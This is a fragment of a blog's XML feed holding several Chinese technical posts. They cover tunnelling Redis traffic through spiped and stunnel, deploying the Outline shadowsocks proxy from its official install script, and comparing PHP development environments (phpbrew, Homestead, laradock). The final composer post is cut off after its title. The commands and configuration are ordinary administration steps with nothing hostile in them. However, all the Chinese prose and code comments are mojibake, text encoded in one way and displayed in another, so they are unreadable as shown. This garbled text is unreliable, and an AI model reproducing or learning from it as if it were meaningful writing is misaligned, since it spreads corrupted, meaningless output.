        <content type="html"><![CDATA[<p>éšç€æŸäº›ä¸šåŠ¡å®‰å…¨æ€§è¦æ±‚æé«˜ï¼Œæ•æ„Ÿæ•°æ®ç»è¿‡ç½‘ç»œæ—¶éœ€è¦åŠ å¯†ä¼ è¾“ã€‚å¦‚MySQL, Redisè¿™äº›åè®®åœ¨ç½‘ç»œä¸­ä¼ è¾“æ˜¯å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æåˆ°æ•°æ®åŒ…å†…éƒ¨ä¿¡æ¯çš„ã€‚</p><p>æœ¬æ–‡åªæ˜¯ç®€å•è®°å½•ä½¿ç”¨TLSåŠ å¯†æŸäº›è½¯ä»¶æ•°æ®æµä½¿ç”¨ï¼Œæœ¬è´¨ä¸Šæ— è®ºspipedè¿˜æ˜¯stunneléƒ½æ˜¯é€šè¿‡å»ºç«‹éš§é“çš„æ–¹å¼è¿›è¡Œå®‰å…¨ä¼ è¾“ã€‚spipedæ˜¯Rediså®˜æ–¹æ¨èä¸€ä¸ªé‡‡ç”¨AESåŠ å¯†ç®—æ³•å¼€æºå·¥å…·ï¼Œè¯¥å·¥å…·ä½œè€…æ˜¯OpenBSDçš„å®‰å…¨åä¼šæˆå‘˜ï¼›stunnelåˆ™æ˜¯ä¸€æ¬¾é‡‡ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•ä¸”é—­æºçš„å·¥å…·ï¼Œæ”¯æŒå¤šä¸ªæœåŠ¡ä½¿ç”¨ï¼Œç›¸å¯¹spippedæ¥è¯´å¯ä»¥åœ¨å¤šä¸ªåœºæ™¯ä½¿ç”¨ã€‚</p><p><a href="https://itschr.is/remote-redis-spiped-vs-stunnel">Remote Redis: Spiped vs Stunnel</a>è¿™ç¯‡æ–‡ç« å¯¹æ¯”äº†ä¸¤æ¬¾å·¥å…·çš„æ€§èƒ½ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡ŒéªŒè¯ã€‚</p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="#ç¤ºä¾‹"></a>#ç¤ºä¾‹</h2><p>spipped</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯†é’¥</span></span><br><span class="line">dd <span class="attribute">if</span>=/dev/urandom <span class="attribute">bs</span>=128 <span class="attribute">count</span>=1 &gt; secret.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ¬åœ°è¿è¡Œ (-e åŠ å¯† -s æº -t ç›®æ ‡)</span></span><br><span class="line">spiped -e -s <span class="string">&#x27;127.0.0.1:6379&#x27;</span> -t æœåŠ¡å™¨IP:8000 -k secret.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœåŠ¡ç«¯è¿è¡Œ (-d è§£å¯†)</span></span><br><span class="line">spiped -d -s <span class="string">&#x27;0.0.0.0:8000&#x27;</span> -t <span class="string">&#x27;127.0.0.1:6379&#x27;</span> -k secret.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å¸®åŠ© (è¿æ¥æ ‘ï¼Œè¶…æ—¶è®¾ç½®)</span></span><br><span class="line">spiped -h</span><br></pre></td></tr></table></figure><p>stunnel</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/stunnel/redis-client.conf</span></span><br><span class="line"><span class="attr">cert</span> = /etc/stunnel/private.pem</span><br><span class="line"><span class="attr">client</span> = <span class="literal">yes</span></span><br><span class="line"><span class="attr">pid</span> = /var/run/stunnel.pid</span><br><span class="line"><span class="section">[redis]</span></span><br><span class="line"><span class="attr">accept</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span></span><br><span class="line"><span class="attr">connect</span> = æœåŠ¡ç«¯IP:<span class="number">6380</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/stunnel/redis-server.conf</span></span><br><span class="line"><span class="attr">cert</span> = /etc/stunnel/private.pem</span><br><span class="line"><span class="attr">pid</span> = /var/run/stunnel.pid</span><br><span class="line"><span class="section">[redis]</span></span><br><span class="line"><span class="attr">accept</span> = æœåŠ¡ç«¯IP:<span class="number">6380</span></span><br><span class="line"><span class="attr">connect</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ"></a>#å‚è€ƒ</h2><p><a href="http://www.tarsnap.com/spiped.html">spipedåŠ å¯†é€šä¿¡</a><br><a href="https://www.stunnel.org/static/stunnel.html">stunnelæ–‡æ¡£</a><br><a href="https://itschr.is/remote-redis-spiped-vs-stunnel">spiped vs stunnelæ€§èƒ½å¯¹æ¯”</a><br><a href="https://laoyur.com/archives/183">ä½¿ç”¨STUNNELåŠ å¯†REDISé€šä¿¡</a><br><a href="https://zhusas.github.io/2018/08/01/mysql-ssl">MySQLå¯ç”¨çš„SSLè¿æ¥çš„æ€è€ƒä¸å®è·µ</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tls </tag>
            
            <tag> spiped </tag>
            
            <tag> stunnel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>outlineéƒ¨ç½²å®è·µ</title>
      <link href="2019/08/02/outline%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/"/>
      <url>2019/08/02/outline%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>outlineæ˜¯å¦ä¸€ä¸ªçˆ¬å¢™çš„æ–¹æ¡ˆï¼Œä¸»è¦é‡‡ç”¨dockerçš„å½¢å¼è¿è¡Œshadowsocksæä¾›æœåŠ¡ï¼Œæ˜¯<a href="https://github.com/Jigsaw-Code">jigsaw</a>å›¢é˜ŸæŠ˜è…¾å‡ºæ¥ä¸€ä¸ªæ¯”è¾ƒå‹å¥½æ–¹æ¡ˆã€‚outlineç”±å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯ç®¡ç†å’Œshadowbox(åŠ å¼ºç‰ˆçš„ss)ç»„æˆï¼Œå…¶ä¸­å®¢æˆ·ç«¯æ”¯æŒwin/linux/mac/android/iOSå¹³å°ã€‚æˆªæ­¢ç›®å‰<a href="https://github.com/Jigsaw-Code/outline-client/releases">å®¢æˆ·ç«¯</a>å‘ç‰ˆ617æ¬¡, åŸºæœ¬æ»¡è¶³æ—¥å¸¸åˆ’æ°´äº†ã€‚</p><p>outlineä¼˜ç‚¹</p><ul><li>æ”¯æŒå…¨å¹³å°</li><li>dockeråŒ–éƒ¨ç½²</li><li>å…¼å®¹shadowsockså®¢æˆ·ç«¯</li><li>æ”¯æŒAPI</li><li>æ”¯æŒç›‘æ§</li><li>TypeScriptå®ç°</li></ul><h2 id="0x1-éƒ¨ç½²"><a href="#0x1-éƒ¨ç½²" class="headerlink" title="0x1 éƒ¨ç½²"></a>0x1 éƒ¨ç½²</h2><p>é¦–å…ˆä½ è¦æœ‰ä¸€å°æœåŠ¡å™¨æ¥éƒ¨ç½²æœåŠ¡ï¼Œoutline manageræœåŠ¡ç«¯è½¯ä»¶æä¾›å››ç§æ–¹æ¡ˆï¼›å…¶ä¸­å‰ä¸‰ç§æ˜¯DigitalOceanã€Google Cloudå’ŒAWSä¸‰å®¶äº‘å‚å•†ã€‚è²Œä¼¼DigitalOceanå¯ä»¥ä½è‡³5åˆ€æ¯æœˆï¼Œæœ€åä¸€ç§æ˜¯è‡ªå»ºæ–¹æ¡ˆï¼Œæ¨èæœ‰vpsçš„ç”¨æˆ·ä½¿ç”¨ã€‚</p><p>æœåŠ¡ç«¯é…ç½®:</p><ul><li><p>ä¸‹è½½å®‰è£…è„šæœ¬</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/Jigsaw-Code/</span>outline-server<span class="regexp">/master/</span>src<span class="regexp">/server_manager/i</span>nstall_scripts/install_server.sh</span><br></pre></td></tr></table></figure></li><li><p>é…ç½®è„šæœ¬</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥çœ‹å‚æ•°</span><br><span class="line">sh install_server.sh -h</span><br><span class="line"></span><br><span class="line">è¾“å‡º:</span><br><span class="line">Usage: install_server.sh [--hostname &lt;hostname&gt;] [--api-port &lt;port&gt;] [--keys-port &lt;port&gt;]</span><br><span class="line"></span><br><span class="line">  --hostname   è®¿é—®åŸŸå</span><br><span class="line">  --api-port   APIç®¡ç†ç«¯å£</span><br><span class="line">  --keys-port  shadowsocksæœåŠ¡ç«¯å£(å…¼å®¹sså®¢æˆ·ç«¯)</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œå®‰è£…</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ç¯å¢ƒéœ€è¦æå‰å®‰è£…docker</span><br><span class="line">sh install_server.sh --hostname åŸŸå --api-port 80 --keys-port 443</span><br><span class="line"></span><br><span class="line"># dockeré•œåƒå®‰è£…</span><br><span class="line">quay.io/outline/shadowbox =&gt; å°è£…çš„shadowsocksé•œåƒ</span><br><span class="line">docker.io/v2tec/watchtower=&gt; dockerå®¹å™¨ç›‘æ§é•œåƒ</span><br></pre></td></tr></table></figure></li><li><p>é…ç½®<br>è„šæœ¬å®‰è£…å®Œæˆåï¼Œç»ˆç«¯ä¸­ä¼šè¾“å‡ºå¦‚ä¸‹ä¿¡æ¯ã€‚æ³¨æ„apiUlrçš„jsonæ•°æ®, æœåŠ¡ç«¯ç®¡ç†å®¢æˆ·ç«¯éœ€è¦è¿™ä¸ªã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">To manage your Outline server, please copy the following line (including curly</span><br><span class="line">brackets) into Step 2 of the Outline Manager interface:</span><br><span class="line"></span><br><span class="line">&#123;&quot;apiUrl&quot;:&quot;https://www.demo.com:33104/pHFagvPGtiprJ4gAVRcSVQ&quot;,&quot;certSha256&quot;:&quot;E71C445A78CF6D37D3959AE190D1E350425D5FB956232228FDEBEDD8CE689CC4&quot;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure></li><li><p>æœåŠ¡ç«¯å®¢æˆ·ç«¯é…ç½®<br>ç²˜è´´ä¸Šè¿°apiUlr jsonå­—ç¬¦åˆ°å®¢æˆ·ç«¯ä¸­å³å¯æ·»åŠ </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* åˆ†äº«é“¾æ¥ä¸­KEYéœ€è¦è§£ç ï¼Œå¤åˆ¶å‡º`ss:<span class="regexp">//</span>`å­—ç¬¦, ä½¿ç”¨<span class="string">&quot;ssåè®®å·¥å…·&quot;</span>è§£å¯†</span><br></pre></td></tr></table></figure></li><li><p>outline serveré…ç½®æ–‡ä»¶(dockerå®¹å™¨)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">åº”ç”¨ç›®å½•: </span><br><span class="line"><span class="regexp">/root/</span>shadowbox</span><br><span class="line"><span class="regexp">/root/</span>shadowbox<span class="regexp">/bin/</span>outline-ss-server</span><br><span class="line"><span class="regexp">/root/</span>shadowbox<span class="regexp">/bin/</span>prometheus</span><br><span class="line"></span><br><span class="line">é…ç½®ç›®å½•:</span><br><span class="line"><span class="regexp">/opt/</span>outline</span><br><span class="line"><span class="regexp">/opt/</span>outline<span class="regexp">/persisted-state/</span>shadowbox_config.json</span><br><span class="line"><span class="regexp">/opt/</span>outline<span class="regexp">/persisted-state/</span>shadowbox_server_config.json</span><br><span class="line"><span class="regexp">/opt/</span>outline<span class="regexp">/persisted-state/</span>outline-ss-server/config.yml</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x2-é¡¹ç›®åˆ†æ"><a href="#0x2-é¡¹ç›®åˆ†æ" class="headerlink" title="0x2 é¡¹ç›®åˆ†æ"></a>0x2 é¡¹ç›®åˆ†æ</h2><p> outlineè¿™ä¸ªé¡¹ç›®å‰èº«æ˜¯<a href="https://github.com/uProxy">uProxy</a>, outlineé¡¹ç›®ä¸»è¦åˆ†ä¸ºoutline-clientã€outline-serverå’Œoutline-ss-serverä¸‰ä¸ªå·¥ç¨‹ã€‚outline-clienté‡‡ç”¨electronå’Œtypescriptå¼€å‘å®¢æˆ·ç«¯ï¼Œç§»åŠ¨ç«¯é…ç½®ç›¸å¯¹ç®€å•ï¼Œgithubä¸Šæœ‰iOSå®¢æˆ·ç«¯<strong>ipa</strong>æ–‡ä»¶ã€‚outline-ss-serverå·¥ç¨‹ä½¿ç”¨golangé‡æ–°å®ç°shadowsocksåŠŸèƒ½ï¼Œç›¸å¯¹<a href="https://github.com/shadowsocks/go-shadowsocks2">go-shadowsocks2</a>å¤šäº†ç«¯å£å¤ç”¨å’Œç›‘æ§ä¸ŠæŠ¥åŠŸèƒ½ï¼Œæ›´å¤šè¯¦æƒ…å‚è€ƒ<a href="https://github.com/Jigsaw-Code/outline-ss-server">å®˜æ–¹è¯´æ˜</a>ã€‚</p><p>outlineæ ¸å¿ƒæ˜¯outline-serverå·¥ç¨‹, åŒ…è£…outline-ss-serverä½œä¸ºä¸€ä¸ªæ ¸å¿ƒä»£ç†æœåŠ¡ã€‚</p><p>é¡¹ç›®æ¨¡å—:</p><ul><li><p>shadowbox</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shadowboxæä¾›outline-ss-serveræœåŠ¡dockeré•œåƒæ„å»ºã€é…ç½®åŠ è½½å’ŒAPIæœåŠ¡å®ç°</span><br></pre></td></tr></table></figure></li><li><p>server_manager</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outlineæœåŠ¡ç«¯ç®¡ç†è½¯ä»¶ï¼Œå’Œoutline-clientç±»å‹éƒ½æ˜¯é‡‡ç”¨electronå®ç°GUIç•Œé¢ï¼Œè°ƒç”¨APIæ¥å£æ“ä½œ</span><br></pre></td></tr></table></figure></li><li><p>sentry_webhook</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—æœåŠ¡ä¸ŠæŠ¥ï¼Œåˆ©ç”¨Google cloud functionåŠŸèƒ½é…åˆhttps://sentry.io/outlinevpnå¹³å°ä¸ŠæŠ¥æ•°æ®</span><br></pre></td></tr></table></figure></li><li><p>metrics_server</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å…ƒæ•°æ®ä¸ŠæŠ¥ï¼Œåˆ©ç”¨Google cloud functionåŠŸèƒ½å®ç°æ•°æ®ä¸ŠæŠ¥ã€‚outline-serverå¯ä»¥è®¾ç½®ä¸ŠæŠ¥æ•°æ®å¼€å…³ã€‚å…·ä½“å‚è€ƒshadowbox_server_config.jsoné…ç½®æ–‡ä»¶ã€‚å¦‚æœDockerç¯å¢ƒå˜é‡æœªè®¾ç½®SB_METRICS_URLå€¼ï¼Œç³»ç»Ÿé»˜è®¤ä¸ŠæŠ¥åœ°å€æ˜¯https://metrics-prod.uproxy.org, æ— æ³•é€šè¿‡outline-serverä¿®æ”¹ä¸ŠæŠ¥åœ°å€ã€‚æ•°æ®ä¸ŠæŠ¥ä¹Ÿæ˜¯outlineè¢«è¯Ÿç—…çš„åœ°æ–¹ã€‚</span><br></pre></td></tr></table></figure></li></ul><p>outlineçš„ä¼˜åŠ¿åœ¨äºæ•´ä½“é…ç½®ç®€å•ï¼Œæœ‰è‡ªæˆä¸€ä½“çš„å®¢æˆ·ç«¯å…¨å®¶æ¡¶ï¼Œä½¿ç”¨æ–¹ä¾¿ã€‚ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼Œéƒ½åªæ˜¯åœ¨shadowsocksä¸Šå¥—äº†ä¸€å±‚å£³è€Œå·²ã€‚</p><h2 id="0x3-å‚è€ƒ"><a href="#0x3-å‚è€ƒ" class="headerlink" title="0x3 å‚è€ƒ"></a>0x3 å‚è€ƒ</h2><ul><li><a href="https://github.com/Jigsaw-Code/outline-server">å®˜æ–¹ä»“åº“</a></li><li><a href="https://github.com/Jigsaw-Code/outline-server/tree/master/src/shadowbox">å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://techcrunch.cn/2018/03/23/alphabets-outline-lets-you-build-your-own-vpn/">æ–°é—»æŠ¥é“</a></li><li><a href="https://github.com/xydche/ss-link-decoder">ssåè®®è§£æå·¥å…·</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> outline </tag>
            
            <tag> é…¸é…¸ä¹³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPæœ¬åœ°å¼€å‘ç¯å¢ƒæµ…æ</title>
      <link href="2019/07/07/PHP%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%B5%85%E6%9E%90/"/>
      <url>2019/07/07/PHP%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>PHPç”Ÿæ€å‘å±•åå‡ å¹´äº†ï¼Œç›®å‰ä¾æ—§åœ¨ä¸šåŠ¡å¼€å‘è¯­è¨€ä¸­å ä¸€å¸­ä¹‹åœ°ã€‚å¤§éƒ¨åˆ†å…¬å¸ä¸šåŠ¡å¼€å‘éƒ½ä¼šè¦æ±‚ç»Ÿä¸€å¼€å‘é£æ ¼ï¼Œä»¥ä¾¿ä¸šåŠ¡æ›´å¥½çš„è¿­ä»£é‡æ„ã€‚PHPç”±äºæ˜¯è§£é‡Šæ€§è¯­è¨€ï¼Œå‰æœŸå¼€å‘ç¯å¢ƒé…ç½®ç®€å•ï¼›ä¾èµ–çš„æ‰©å±•åŠä¸‰æ–¹æœåŠ¡å¹¶ä¸å¤æ‚ï¼Œä½†éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œå¼•å…¥çš„ä¸‰æ–¹æœåŠ¡ä¸æ–­è¿­ä»£æ›´æ–°å°±ä¼šé€ æˆå¼€å‘äººå‘˜çš„ç¯å¢ƒä¸ç»Ÿä¸€ï¼Œå®¹æ˜“å‡ºç°æœ¬åœ°ç¯å¢ƒæµ‹è¯•æ²¡æœ‰é—®é¢˜ï¼Œä¸€ä¸Šçº¿å°±å‡ºç°å„ç§å¥‡æ€ªçš„é—®é¢˜ã€‚</p><p>ç¬”è€…æ€»ç»“ä¸‹ç›®å‰PHPæœ¬åœ°å¼€æ”¾ç¯å¢ƒè¶‹åŠ¿ï¼Œå¤§è‡´æœ‰ä¸‰ç±»</p><h2 id="é›†æˆç¯å¢ƒ"><a href="#é›†æˆç¯å¢ƒ" class="headerlink" title="#é›†æˆç¯å¢ƒ"></a>#é›†æˆç¯å¢ƒ</h2><p>å¼€å‘ä½¿ç”¨è¯¸å¦‚phpstudyã€xamppã€mampç­‰é›†æˆç¯å¢ƒï¼Œè¿™äº›é›†æˆç¯å¢ƒåŸºæœ¬ä¸Šæ»¡è¶³PHPå¼€å‘æ—¥å¸¸ã€‚è¿™ç±»é›†æˆç¯å¢ƒåœ¨ç»Ÿä¸€é…ç½®PHPæ‰©å±•æ¯”è¾ƒéº»çƒ¦ï¼Œå°¤å…¶æ¶‰åŠwindowsç¯å¢ƒæ‰©å±•æ›´åŠ ç¹çã€‚</p><h2 id="phpbrewè‡ªç”±å¼"><a href="#phpbrewè‡ªç”±å¼" class="headerlink" title="#phpbrewè‡ªç”±å¼"></a>#phpbrewè‡ªç”±å¼</h2><p>phpbrewæ˜¯ä¸€ä¸ªPHPå¤šç‰ˆæœ¬åŒ…ç®¡ç†è½¯ä»¶ï¼Œæ”¯æŒå¤šç‰ˆæœ¬ï¼Œè‡ªç”±é…ç½®æ‰©å±•ç­‰ä¾¿æ·æ“ä½œã€‚ç¬”è€…æ¯”è¾ƒæ¨èä½¿ç”¨è¿™ç§æ–¹å¼å¼€å‘PHPé¡¹ç›®ï¼Œphpbrewåœ¨mac/linuxç¯å¢ƒä½¿ç”¨åŸºæœ¬æ»¡è¶³éœ€æ±‚ï¼Œwindowså¼€å‘ç¯å¢ƒé…ç½®phpbrewæ¯”è¾ƒéº»çƒ¦ä¸€äº›ã€‚å¾®è½¯è¿™å‡ å¹´æ¨è¿›windows shellç¯å¢ƒçš„ä½¿ç”¨ï¼Œç›¸ä¿¡è¿‡å‡ å¹´ä¸‰ç«¯å¼€å‘ç¯å¢ƒå·®å¼‚æ€§ä¼šé€æ¸ç¼©å°ã€‚</p><p>ç¤ºä¾‹:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å®‰è£…ç‰¹å®šç‰ˆæœ¬</span></span><br><span class="line"><span class="attribute">phpbrew</span> install <span class="number">7</span>.<span class="number">3</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®PHPç‰ˆæœ¬</span></span><br><span class="line"><span class="attribute">phpbrew</span> use <span class="number">7</span>.<span class="number">3</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰©å±•å®‰è£…</span></span><br><span class="line"><span class="attribute">phpbrew</span>  ext install ldap</span><br><span class="line"></span><br><span class="line"><span class="comment">#å…³é—­phpbrew</span></span><br><span class="line"><span class="attribute">phpbrew</span> <span class="literal">off</span></span><br></pre></td></tr></table></figure><h2 id="Laravel-homestead"><a href="#Laravel-homestead" class="headerlink" title="#Laravel homestead"></a>#Laravel homestead</h2><p>laravel homesteadæ˜¯laravelå®˜æ–¹å‡ºå“çš„å¼€å‘ç¯å¢ƒæ–¹æ¡ˆï¼Œé€šè¿‡vagrantåŠ è½½é…ç½®æ–‡ä»¶åˆå§‹åŒ–PHPé¡¹ç›®æ‰€éœ€è¦çš„ç¯å¢ƒã€‚vagrantä½¿ç”¨virtualboxç­‰è™šæ‹Ÿæœºæ–¹å¼åŠ è½½laravel/homestead boxé•œåƒçš„æ–¹å¼ç»Ÿä¸€é¡¹ç›®ä¸­ç ”å‘äººå‘˜çš„å¼€å‘ç¯å¢ƒï¼Œè¯¥æ–¹æ¡ˆå±äºç¬¨é‡çš„æ–¹å¼ã€‚boxé•œåƒæ–‡ä»¶æ¯”è¾ƒå¤§ã€éœ€è¦é…ç½®homestead.yamlå’Œéœ€è¦å®‰è£…virtualboxæ²¡æœ‰é‚£ä¹ˆçµæ´»ã€‚ä¼ä¸šçº§å¼€å‘å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ¡ˆï¼Œä¸è¿‡homesteadæ”¯æŒå…¶ä»–æ¡†æ¶ä¹ˆï¼Œå¦‚Yii2/Symfony/CIï¼Ÿ</p><h2 id="DockeråŒ–"><a href="#DockeråŒ–" class="headerlink" title="#DockeråŒ–"></a>#DockeråŒ–</h2><p>ä¸€åˆ‡æœåŠ¡çš†å¯dockerï¼Ÿéšç€å¾®æœåŠ¡åŒ–ã€k8så’Œäº‘ä¸ŠæœåŠ¡ç­‰æŠ€æœ¯å…´èµ·ï¼Œdockerè¿™ä¸ªå®¹å™¨ä¹Ÿéšä¹‹æˆäº†ç ”å‘äººå‘˜å¸¸å¸¸è®¨è®ºçš„è¯é¢˜ã€‚dockerä¼˜ç‚¹ä¸»è¦åœ¨äºå®¹å™¨åŒ–ã€éš”ç¦»å‹ã€æ˜“äºç®¡ç†å’Œè½»ä¾¿æ€§ä¸ºä¸»ã€‚PHPåœ¨dockerçš„ç”Ÿæ€ç¯é™å‘å±•ä¹Ÿä¸é”™ï¼Œä¸»æµé•œåƒåŸºæœ¬éƒ½æœ‰ã€‚<br>PHPè¿™é‡Œé‡‡ç”¨dockerä¸»è¦å­˜åœ¨ä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯dockeræ„å»ºä¸šåŠ¡ä»£ç ï¼›äºŒæ˜¯dockeræ„å»ºæœ¬åœ°å¼€å‘çš„ç¯å¢ƒã€‚å‰è€…é€šè¿‡gitlabä¸­çš„ciè„šæœ¬ç»Ÿä¸€æ„å»ºä»£ç è¿è¡Œç¯å¢ƒï¼Œä¾¿äºè¿ç»´ç®¡ç†å‘å¸ƒå›æ»šç­‰æ“ä½œã€‚åè€…ä¸»è¦æ˜¯ä¾¿äºå¼€å‘äººå‘˜æœ¬åœ°æ­å»ºç¯å¢ƒèŠ‚çœ<strong>å¤§é‡æ—¶é—´</strong>ã€‚å¾ˆå¤šæ—¶å€™åªæ˜¯éªŒè¯æŸäº›æœåŠ¡çš„åœºæ™¯ï¼Œæ‰‹åŠ¨æ­å»ºç¯å¢ƒä¼šé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼›æ‰‹åŠ¨æ­å»ºå”¯ä¸€å¥½å¤„å°±æ˜¯å¯ä»¥éå¸¸äº†è§£ç³»ç»Ÿçš„è¿è¡ŒåŠç³»ç»Ÿçš„å®˜æ–¹æ‰‹å†Œ :)</p><p>laradockæ˜¯PHPé›†æˆç¯å¢ƒdockeråŒ–ä¸€ä¸ªæ–¹æ¡ˆï¼Œé€šè¿‡å†…ç½®å¼€å‘ç¯å¢ƒæ‰€éœ€çš„dockerfileæ–‡ä»¶è¿›è¡Œè‡ªåŠ¨æ„å»ºï¼›è¯¥é¡¹ç›®ç›®å‰githubæ‹¥æœ‰æ˜Ÿæ˜Ÿ7k+çš„çŠ¶æ€ï¼Œä»“åº“å†…ç½®è®¸å¤šæœåŠ¡çš„dockerfileå¯ä»¥ç”¨æ¥å­¦ä¹ æŸäº›æœåŠ¡dockerfileå†™æ³•ï¼Œæ¨èå­¦ä¹ ä¸‹</p><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="#ç»“è®º?"></a>#ç»“è®º?</h2><p>ç”±äºæ¯ä¸ªäººçš„å–œå¥½ä¸åŒï¼Œå¼€å‘ä¹ æƒ¯ä¹Ÿä¸åŒã€‚å¦‚æœæƒ³è‡ªç”±äº›ï¼Œæ¨èphpbrew+dockerå¼€å‘PHPé¡¹ç›®ï¼›ä¼ä¸šçº§æƒ³å¼ºåˆ¶è§„èŒƒå¼€å‘ç¯å¢ƒå¯ä»¥ä½¿ç”¨homesteadæ–¹æ¡ˆã€‚<br>å¯¹äºwindowsç¯å¢ƒä¸‹çš„å¼€å‘è€…ï¼Œç¬”è€…å»ºè®®ä¸‹è½½virtualboxå®‰è£…debianç¯å¢ƒè¿›è¡Œæ—¥å¸¸å¼€å‘ï¼Œæ¯•ç«Ÿwindowsä¸‹å¼€å‘ä¼šå­˜åœ¨å¾ˆå¤šè¯¡å¼‚é—®é¢˜ã€‚</p><p><em>æˆ–è®¸å‡ å¹´ååˆæµè¡ŒXXæ–¹æ¡ˆå‘¢ï¼Ÿä¸€åˆ‡éƒ½åªæ˜¯è¶‹åŠ¿ä¸‹çš„äº§ç‰©</em></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ"></a>#å‚è€ƒ</h2><p><a href="https://www.vagrantup.com/docs/index.html">vagrantupæ–‡æ¡£</a><br><a href="https://laravel.com/docs/5.8/homestead">Homesteadæ–‡æ¡£</a><br><a href="https://github.com/phpbrew/phpbrew">phpbrewä»“åº“</a><br><a href="https://laradock.io/introduction/">laradockæ–‡æ¡£</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpbrew </tag>
            
            <tag> laradock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>composeråŠ é€Ÿ</title>
      <link href="2019/07/07/composer%E5%8A%A0%E9%80%9F/"/>
      <url>2019/07/07/composer%E5%8A%A0%E9%80%9F/</url>
      
